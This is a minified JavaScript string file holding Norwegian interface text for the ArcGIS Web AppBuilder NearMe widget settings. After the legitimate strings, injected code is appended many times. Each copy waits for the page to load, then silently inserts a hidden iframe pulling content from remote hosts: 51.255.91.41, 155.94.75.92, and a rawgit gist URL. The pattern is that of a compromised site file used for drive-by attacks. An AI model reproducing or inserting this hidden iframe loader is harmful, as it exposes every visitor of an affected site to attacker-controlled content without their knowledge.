// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/NearMe/setting/nls/strings":{units:{miles:{displayText:"Miles",acronym:"mi"},kilometers:{displayText:"Kilometer",acronym:"km"},feet:{displayText:"Fot",acronym:"ft"},meters:{displayText:"Meter",acronym:"m"}},searchSourceSetting:{searchSourceSettingTabTitle:"S\u00f8kekildeinnstillinger",searchSourceSettingTitle:"S\u00f8kekildeinnstillinger",searchSourceSettingTitleHintText:"Legg til og konfigurer geokodingstjenester eller geoobjektslag som s\u00f8kekilder. Disse angitte kildene avgj\u00f8r hva som er s\u00f8kbart i s\u00f8keboksen.",
addSearchSourceLabel:"Legg til s\u00f8kekilde",featureLayerLabel:"Geoobjektlag",geocoderLabel:"Geokoder",nameTitle:"Navn",generalSettingLabel:"Generell innstilling",allPlaceholderLabel:"Plassholdertekst for s\u00f8k i alt:",allPlaceholderHintText:"Hint: Skriv inn teksten som skal vises som plassholder n\u00e5r du s\u00f8ker i alle lag og geokoder.",generalSettingCheckboxLabel:"Vis popuptekst for funnet geoobjekt eller lokasjon",countryCode:"Lands- eller regionskode(r)",countryCodeEg:"f.eks. ",countryCodeHint:"Hvis du lar dette feltet st\u00e5 tomt, s\u00f8kes det i alle land og regioner",
questionMark:"?",searchInCurrentMapExtent:"S\u00f8k kun i gjeldende kartutstrekning",zoomScale:"Zoomskala",locatorUrl:"Geokoder-URL",locatorName:"Geokodernavn",locatorExample:"Eksempel",locatorWarning:"Denne versjonen av geokodingstjenesten st\u00f8ttes ikke. Widgeten st\u00f8tter versjon 10.0 og nyere av geokodingstjenesten.",locatorTips:"Forslag er ikke tilgjengelige, fordi geokodingstjenesten har ikke st\u00f8tte for forslag.",layerSource:"Lagkilde",setLayerSource:"Angi lagkilde",setGeocoderURL:"Angi geokoder-URL",
searchLayerTips:"Forslag er ikke tilgjengelige, fordi featuretjenesten ikke har st\u00f8tte for paginering.",placeholder:"Plassholdertekst",searchFields:"S\u00f8kefelter",displayField:"Visningsfelt",exactMatch:"N\u00f8yaktig treff",maxSuggestions:"Maks. antall forslag",maxResults:"Maks. antall resultater",enableLocalSearch:"Aktiver lokalt s\u00f8k",minScale:"Minste m\u00e5lestokk",minScaleHint:"N\u00e5r kartm\u00e5lestokken er st\u00f8rre enn denne m\u00e5lestokken, brukes lokalt s\u00f8k",radius:"Radius",
radiusHint:"Angir radiusen for et omr\u00e5de rundt det gjeldende midtpunktet i kartet som brukes til \u00e5 styrke rangeringen til geokodingskandidater, slik at kandidater n\u00e6rmest lokasjonen returneres f\u00f8rst",meters:"Meter",setSearchFields:"Angi s\u00f8kefelter",set:"Angi",fieldName:"Navn",invalidUrlTip:"URL-en ${URL} er ugyldig eller ikke tilgjengelig."},searchSetting:{searchSettingTabTitle:"S\u00f8keinnstillinger",defaultBufferDistanceLabel:"Angi standard bufferavstand",maxResultCountLabel:"Begrens antall resultater",
maxResultCountHintLabel:"Hint: Angi maksimum antall resultater som skal vises. Verdien 1 returnerer n\u00e6rmeste geoobjekt.",maxBufferDistanceLabel:"Angi maksimal bufferavstand",bufferDistanceUnitLabel:"Enheter for bufferavstand",defaultBufferHintLabel:"Hint: Angi standardverdi for bufferglidebryteren",maxBufferHintLabel:"Hint: Angi maksimumsverdi for bufferglidebryteren",bufferUnitLabel:"Hint: Angi enhet for oppretting av buffer",selectGraphicLocationSymbol:"Adresse- eller lokasjonssymbol",graphicLocationSymbolHintText:"Hint: Symbol for adresse det er s\u00f8kt etter, eller lokasjon det er klikket p\u00e5.",
addressLocationPolygonHintText:"Tips: Symbol for gjennoms\u00f8kt polygonlag",popupTitleForPolygon:"Velg polygon for valgt adresselokasjon",popupTitleForPolyline:"Velg linje for adresselokasjon",addressLocationPolylineHintText:"Tips: Symbol for gjennoms\u00f8kt polygonlag",fontColorLabel:"Velg skriftfarge for s\u00f8keresultater",fontColorHintText:"Hint: Skriftfarge for s\u00f8keresultater",zoomToSelectedFeature:"Zoom til det valgte geoobjektet",zoomToSelectedFeatureHintText:"Hint: Zoom til det valgte geoobjektet i stedet for bufferen",
intersectSearchLocation:"Returner kryssende polygon(er)",intersectSearchLocationHintText:"Hint: Returner  polygon(er) som inneholder lokasjonen det er s\u00f8kt etter, i stedet for polygoner i bufferen",enableProximitySearch:"Aktiver n\u00e6rhetss\u00f8k",enableProximitySearchHintText:"Tips: Aktiver muligheten til \u00e5 s\u00f8ke etter lokasjoner n\u00e6r et valgt resultat",bufferVisibilityLabel:"Angi buffersynlighet",bufferVisibilityHintText:"Hint: Bufferen vises i kartet",bufferColorLabel:"Angi buffersymbol",
bufferColorHintText:"Hint: Velg farge og gjennomsiktighet for buffer",searchLayerResultLabel:"Tegn kun resultater for valgt lag",searchLayerResultHint:"Hint: Kun laget som er valgt i s\u00f8keresultatene tegnes p\u00e5 kartet",showToolToSelectLabel:"Angi lokasjon-knapp",showToolToSelectHintText:"Hint: Viser en knapp for \u00e5 angi en lokasjon p\u00e5 kartet i stedet for at lokasjonen alltid angis ved \u00e5 klikke p\u00e5 kartet.",geoDesicParamLabel:"Bruk geodetisk buffer",geoDesicParamHintText:"Hint: Bruk geodetisk buffer i stedet for euklidisk buffer (planar)."},
layerSelector:{selectLayerLabel:"Velg et eller flere s\u00f8kelag",layerSelectionHint:"Hint: Bruk Angi-knappen til \u00e5 velge et eller flere lag",addLayerButton:"Angi"},routeSetting:{routeSettingTabTitle:"Innstillinger for veibeskrivelser",routeServiceUrl:"Rutetjeneste",buttonSet:"Angi",routeServiceUrlHintText:"Hint: Klikk p\u00e5 Angi for \u00e5 bla gjennom og velge en rutetjeneste",directionLengthUnit:"Lengdeenheter for rutebeskrivelse",unitsForRouteHintText:"Hint: Brukes til \u00e5 vise enheter for rute",
selectRouteSymbol:"Velg symbol for rutevisning",routeSymbolHintText:"Hint: Brukes til \u00e5 vise linjesymbol for ruten",routingDisabledMsg:"Kontroller at rutetjenesten er aktivert for elementet i applikasjonsinnstillingene."},symbologySetting:{symbologySettingTabTitle:"Symbolinnstillinger",addSymbologyBtnLabel:"Legg til nye symboler",layerNameTitle:"Lagnavn",fieldTitle:"Felt",valuesTitle:"Verdier",symbolTitle:"Symbol",actionsTitle:"Handlinger",invalidConfigMsg:"Dupliser felt : ${fieldName} for lag : ${layerName}"},
filterSetting:{filterSettingTabTitle:"Filterinnstillinger",addTaskTip:"Legg til ett eller flere filtre i det/de valgte s\u00f8kelaget/s\u00f8kelagene, og konfigurer parametere for hvert av dem.",enableMapFilter:"Fjern det forh\u00e5ndsvalgte lagfilteret fra kartet.",newFilter:"Nytt filter",filterExpression:"Filteruttrykk",layerDefaultSymbolTip:"Bruk lagets standardsymbol",uploadImage:"Last opp et bilde",selectLayerTip:"Du m\u00e5 velge et lag.",setTitleTip:"Du m\u00e5 angi en tittel.",noTasksTip:"Ingen filter er konfigurert. Klikk p\u00e5 ${newFilter} for \u00e5 legge til et nytt.",
collapseFiltersTip:"Skjul eventuelle filteruttrykk n\u00e5r widgeten \u00e5pnes"},networkServiceChooser:{arcgislabel:"Legg til fra ArcGIS Online",serviceURLabel:"Legg til tjeneste-URL",routeURL:"Rute-URL",validateRouteURL:"Valider",exampleText:"Eksempel",hintRouteURL1:"https://route.arcgis.com/arcgis/rest/services/World/Route/NAServer/",hintRouteURL2:"https://route.arcgis.com/arcgis/rest/services/World/Route/NAServer/Route_World",invalidRouteServiceURL:"Angi en gyldig rutetjeneste",rateLimitExceeded:"Hastighetsbegrensningen er overskredet. Pr\u00f8v p\u00e5 nytt senere.",
errorInvokingService:"Brukernavnet eller passordet er feil."},errorStrings:{bufferErrorString:"Angi en gyldig numerisk verdi.",selectLayerErrorString:"Velg laget eller lagene det skal s\u00f8kes i.",invalidDefaultValue:"Standard bufferavstand kan ikke v\u00e6re tom. Angi bufferavstanden.",invalidMaximumValue:"Maksimum bufferavstand kan ikke v\u00e6re tom. Angi bufferavstanden.",defaultValueLessThanMax:"Angi standard bufferavstand med maksimumsgrensen",defaultBufferValueGreaterThanOne:"Standard bufferavstand kan ikke v\u00e6re mindre enn 0",
maximumBufferValueGreaterThanOne:"Du m\u00e5 angi en maksimum bufferavstand som er h\u00f8yere enn 0",invalidMaximumResultCountValue:"Angi en gyldig verdi for maksimum antall resultater",invalidSearchSources:"Ugyldige s\u00f8kekildeinnstillinger"},symbolPickerPreviewText:"Forh\u00e5ndsvisning:",_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});